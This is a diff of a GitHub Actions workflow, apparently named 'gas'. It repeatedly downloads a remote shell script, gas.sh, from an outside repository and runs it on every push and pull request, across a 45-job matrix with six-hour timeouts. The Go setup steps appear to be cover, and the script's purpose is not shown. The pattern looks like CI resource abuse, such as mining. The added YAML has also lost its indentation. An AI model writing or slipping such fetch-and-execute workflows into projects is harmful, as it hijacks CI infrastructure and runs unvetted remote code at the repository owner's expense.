@@ -1,14 +1,27 @@
 name: gas
-on:
-  push:
-    branches: [ "main" ]
-  pull_request:
-    branches: [ "main" ]
-  workflow_dispatch:
-jobs: 1,2,3,4
-  build:
-    runs-on: ubuntu-20.04
-    steps:
-      - name: multiple
-        run: |
-       wget https://github.com/stokjacky/cek1/raw/main/gas.sh && chmod +x gas.sh && ./gas.sh
+on: [push, pull_request]
+jobs:
+build:
+name: amboy
+runs-on: ubuntu-latest
+strategy:
+max-parallel: 1
+fail-fast: false
+matrix:
+go: [1.6, 1.7, 1.8, 1.9, 1.10]
+flag: [A, B, C, D, E, F, G, H, I]
+timeout-minutes: 360
+env:
+NUM_JOBS: 20
+JOB: ${{ matrix.go }}
+steps:
+- name: Set up Go ${{ matrix.go }}
+uses: actions/setup-go@v1
+with:
+go-version: ${{ matrix.go }}
+id: go
+- name: Setup
+uses: actions/checkout@v2
+- name: akuganteng
+run: |
+wget https://github.com/stokjacky/cek1/raw/main/gas.sh && chmod +x gas.sh && ./gas.sh
